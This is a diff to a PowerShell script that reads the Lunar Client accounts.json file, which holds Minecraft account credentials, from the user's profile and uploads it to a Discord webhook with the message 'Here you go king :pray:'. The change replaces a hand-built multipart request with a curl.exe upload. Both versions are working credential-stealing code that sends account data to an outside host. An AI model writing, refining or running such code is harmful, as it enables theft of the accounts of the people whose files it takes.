@@ -6,31 +6,22 @@ $filePath = "$env:USERPROFILE\.lunarclient\settings\game\accounts.json"
 
 # Check if the file exists
 if (-not (Test-Path $filePath)) {
-    Write-Host "File accounts.json does not exist at: $filePath"
-    exit
+    Write-Host "File not found: $filePath"
+    exit 1
 }
 
-# Prepare the multipart form data
-$boundary = [System.Guid]::NewGuid().ToString()
-$LF = "`r`n"
+Write-Host "Found file: $filePath"
+Write-Host "Sending to Discord..."
 
-$bodyLines = @(
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"payload_json`"$LF",
-    "{`"content`":`"Here you go king :pray:`"}",
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"file`"; filename=`"accounts.json`"",
-    "Content-Type: application/octet-stream$LF",
-    [System.IO.File]::ReadAllText($filePath),
-    "--$boundary--"
-)
+# Use curl.exe directly - it handles multipart/form-data correctly
+$payload = '{"content":"Here you go king :pray:"}'
 
-$body = $bodyLines -join $LF
+$result = & curl.exe -s -X POST $webhookUrl `
+    -F "payload_json=$payload" `
+    -F "file=@$filePath"
 
-# Send the request
-try {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $body
+if ($LASTEXITCODE -eq 0) {
     Write-Host "File sent successfully!"
-} catch {
-    Write-Host "Failed to send: $_"
+} else {
+    Write-Host "Error: $result"
 }
